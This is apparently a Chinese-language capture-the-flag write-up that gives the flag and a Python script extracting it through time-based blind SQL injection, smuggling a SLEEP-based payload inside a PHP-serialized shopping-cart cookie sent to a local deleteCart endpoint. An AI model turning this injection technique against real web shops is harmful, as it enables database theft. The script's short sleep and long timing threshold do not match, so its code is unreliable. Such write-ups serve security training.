## flag

MOCSCTF{CTF@is@very@good}

## 解題步驟

1. 透過 SQL 注入漏洞，從資料庫表 flag 中提取 flag 欄位的值。
2. 使用 二分查找演算法 逐個字元猜解數據，利用伺服器回應時間差異判斷字元的 ASCII 值。

```python
import requests
import subprocess 
import requests
import time


url = "http://localhost:80"
result = ""
i = 0

print("[+]盲注中...")
while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        #payload = "select database()" # 查询数据库
        payload = "select group_concat(concat_ws(0x7e,flag)) from flag limit 0,1" # 查询账号和密码
        code = f'''
                $info = array(
                    0=>array(
                        "ProductID"=>"1)or(if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.005),1))#"
                    )
                );
                echo urlencode(serialize($info));
        '''
        codes = subprocess.run(['php','-r',code], stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode()

        full_url = url+"/index.php/public/deleteCart?id=a"
        headers = {
            "cookie":"youdiany_shopping_cart="+codes.replace("+","%20")
        }

        t1=time.time() 
        r = requests.get(url=full_url,headers=headers)
        t2=time.time()
        if t2-t1>1:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```